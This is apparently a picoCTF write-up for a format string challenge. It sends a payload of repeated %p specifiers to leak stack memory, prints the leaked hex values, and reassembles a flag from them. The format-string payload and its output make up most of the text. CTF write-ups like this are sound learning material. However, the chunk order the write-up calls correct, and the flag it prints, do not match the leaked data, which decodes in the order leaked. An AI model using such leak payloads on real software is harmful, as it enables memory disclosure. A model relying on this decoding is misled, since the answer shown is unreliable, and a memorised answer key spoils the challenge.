This payload of many %p values with commas could be sent to get the relevant values.

%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p

This gives many hex values:

0x402118,(nil),0x73d0dde92a00,(nil),0x811880,0xa347834,0x7ffe00d7f2f0,0x73d0ddc83e60,0x73d0ddea84d0,0x1,0x7ffe00d7f3c0,(nil),(nil),0x7b4654436f636970,0x355f31346d316e34,0x3478345f33317937,0x35625f673431665f,0x7d663839623764,0x7,0x73d0ddeaa8d8,0x2300000007,0x206e693374307250,0xa336c797453,0x9

Then put it in CyberChef to convert from hex.

From there all of the bad values could be removed and easily seen what are the correct values that need to be looked at:

0x7b4654436f636970,0x355f31346d316e34,0x3478345f33317937,0x35625f673431665f,0x7d663839623764

It first could be seen that it is in reverse order so in CyberChef the reverse function could be added. It now looks like the text is in the right order because "picoCTF{" could be seen however it doesn't look like the flag because the actual hex values need to be re-arranged as well. Here is the correct order:

0x7d663839623764,0x355f31346d316e34,0x35625f673431665f,0x3478345f33317937,0x7b4654436f636970

Decoding this should give the flag.

Flag: picoCTF{7y13_4x4_f14g_b54n1m41_5d7...}
